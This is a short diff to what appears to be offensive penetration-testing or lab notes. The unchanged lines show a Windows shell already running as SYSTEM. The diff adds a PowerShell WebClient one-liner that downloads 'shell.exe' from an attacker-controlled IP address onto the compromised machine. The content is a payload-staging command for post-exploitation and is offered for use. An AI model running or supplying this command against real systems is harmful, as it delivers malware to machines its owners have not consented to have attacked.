@@ -21,3 +21,9 @@ WOOTWOOT
 c:\Windows\system32>whoami
 nt authority\system
 ```
+
+## New-Object System.Net.WebClient (alternate download method)
+```
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.2.3.85/shell.exe','shell.exe')"
+```
+
